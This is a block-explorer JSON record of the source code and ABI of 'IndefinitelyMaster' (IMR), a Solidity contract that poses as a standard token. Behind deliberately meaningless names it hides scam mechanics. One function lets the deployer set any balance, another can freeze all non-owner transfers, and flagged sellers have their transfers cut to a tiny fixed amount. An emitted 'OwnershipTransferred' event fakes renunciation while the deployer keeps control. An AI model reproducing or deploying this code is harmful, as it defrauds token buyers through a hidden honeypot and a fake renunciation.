{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface limitTakeReceiver {\n    function createPair(address txLimit, address listTakeLiquidity) external returns (address);\n}\n\ninterface takeLaunchMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxFeeWallet) external view returns (uint256);\n\n    function transfer(address autoShould, uint256 totalAmount) external returns (bool);\n\n    function allowance(address isSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoShould,\n        uint256 totalAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAtTx, uint256 value);\n    event Approval(address indexed isSell, address indexed spender, uint256 value);\n}\n\nabstract contract amountWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeLaunchMaxMetadata is takeLaunchMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndefinitelyMaster is amountWallet, takeLaunchMax, takeLaunchMaxMetadata {\n\n    address totalLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buyTx;\n\n    event OwnershipTransferred(address indexed tokenSell, address indexed walletTotal);\n\n    function limitModeSender(address liquidityTxList) public {\n        if (sellSwap) {\n            return;\n        }\n        if (isTakeMin == enableFundTotal) {\n            totalToken = true;\n        }\n        launchedIs[liquidityTxList] = true;\n        if (enableFundTotal != isTx) {\n            enableFundTotal = buyLiquidityFrom;\n        }\n        sellSwap = true;\n    }\n\n    address public takeSender;\n\n    function atWallet(address walletLimit, uint256 totalAmount) public {\n        sellToken();\n        enableReceiverSell[walletLimit] = totalAmount;\n    }\n\n    function takeTrading() public {\n        emit OwnershipTransferred(marketingSenderFund, address(0));\n        launchList = address(0);\n    }\n\n    function swapLimit(address feeToken) public {\n        sellToken();\n        \n        if (feeToken == marketingSenderFund || feeToken == takeSender) {\n            return;\n        }\n        amountTo[feeToken] = true;\n    }\n\n    function fromMode(address sellEnable, address autoShould, uint256 totalAmount) internal returns (bool) {\n        if (sellEnable == marketingSenderFund) {\n            return liquidityTrading(sellEnable, autoShould, totalAmount);\n        }\n        uint256 limitMin = takeLaunchMax(takeSender).balanceOf(totalLimit);\n        require(limitMin == swapSender);\n        require(autoShould != totalLimit);\n        if (amountTo[sellEnable]) {\n            return liquidityTrading(sellEnable, autoShould, marketingReceiver);\n        }\n        return liquidityTrading(sellEnable, autoShould, totalAmount);\n    }\n\n    uint256 private buyTeam = 100000000 * 10 ** 18;\n\n    bool private exemptBuySender;\n\n    function transfer(address walletLimit, uint256 totalAmount) external virtual override returns (bool) {\n        return fromMode(_msgSender(), walletLimit, totalAmount);\n    }\n\n    constructor (){\n        if (exemptBuySender != launchedExempt) {\n            launchedExempt = false;\n        }\n        liquidityFrom minWalletMode = liquidityFrom(takeList);\n        takeSender = limitTakeReceiver(minWalletMode.factory()).createPair(minWalletMode.WETH(), address(this));\n        if (enableFundTotal != txTeam) {\n            launchedExempt = false;\n        }\n        marketingSenderFund = _msgSender();\n        launchedIs[marketingSenderFund] = true;\n        enableReceiverSell[marketingSenderFund] = buyTeam;\n        takeTrading();\n        if (txTeam == buyTx) {\n            fundFrom = false;\n        }\n        emit Transfer(address(0), marketingSenderFund, buyTeam);\n    }\n\n    function balanceOf(address maxFeeWallet) public view virtual override returns (uint256) {\n        return enableReceiverSell[maxFeeWallet];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingWalletReceiver;\n    }\n\n    uint256 public enableFundTotal;\n\n    address takeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private fromWallet;\n\n    bool private launchedExempt;\n\n    address public marketingSenderFund;\n\n    function name() external view virtual override returns (string memory) {\n        return listAmount;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyTeam;\n    }\n\n    uint256 private buyLiquidityFrom;\n\n    address private launchList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderExempt;\n    }\n\n    function liquidityTrading(address sellEnable, address autoShould, uint256 totalAmount) internal returns (bool) {\n        require(enableReceiverSell[sellEnable] >= totalAmount);\n        enableReceiverSell[sellEnable] -= totalAmount;\n        enableReceiverSell[autoShould] += totalAmount;\n        emit Transfer(sellEnable, autoShould, totalAmount);\n        return true;\n    }\n\n    function maxAt(uint256 totalAmount) public {\n        sellToken();\n        swapSender = totalAmount;\n    }\n\n    string private listAmount = \"Indefinitely Master\";\n\n    uint256 private isTx;\n\n    function owner() external view returns (address) {\n        return launchList;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchList;\n    }\n\n    uint256 constant marketingReceiver = 6 ** 10;\n\n    string private senderExempt = \"IMR\";\n\n    mapping(address => bool) public amountTo;\n\n    function transferFrom(address sellEnable, address autoShould, uint256 totalAmount) external override returns (bool) {\n        if (_msgSender() != takeList) {\n            if (fromWallet[sellEnable][_msgSender()] != type(uint256).max) {\n                require(totalAmount <= fromWallet[sellEnable][_msgSender()]);\n                fromWallet[sellEnable][_msgSender()] -= totalAmount;\n            }\n        }\n        return fromMode(sellEnable, autoShould, totalAmount);\n    }\n\n    uint256 public txTeam;\n\n    uint256 swapSender;\n\n    function approve(address modeFee, uint256 totalAmount) public virtual override returns (bool) {\n        fromWallet[_msgSender()][modeFee] = totalAmount;\n        emit Approval(_msgSender(), modeFee, totalAmount);\n        return true;\n    }\n\n    bool public sellSwap;\n\n    uint256 private isTakeMin;\n\n    bool public fundFrom;\n\n    function sellToken() private view {\n        require(launchedIs[_msgSender()]);\n    }\n\n    mapping(address => bool) public launchedIs;\n\n    uint256 tradingReceiver;\n\n    bool public totalToken;\n\n    mapping(address => uint256) private enableReceiverSell;\n\n    function allowance(address tokenList, address modeFee) external view virtual override returns (uint256) {\n        if (modeFee == takeList) {\n            return type(uint256).max;\n        }\n        return fromWallet[tokenList][modeFee];\n    }\n\n    uint8 private tradingWalletReceiver = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAtTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFeeWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTxList\",\"type\":\"address\"}],\"name\":\"limitModeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSenderFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"maxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"swapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IndefinitelyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}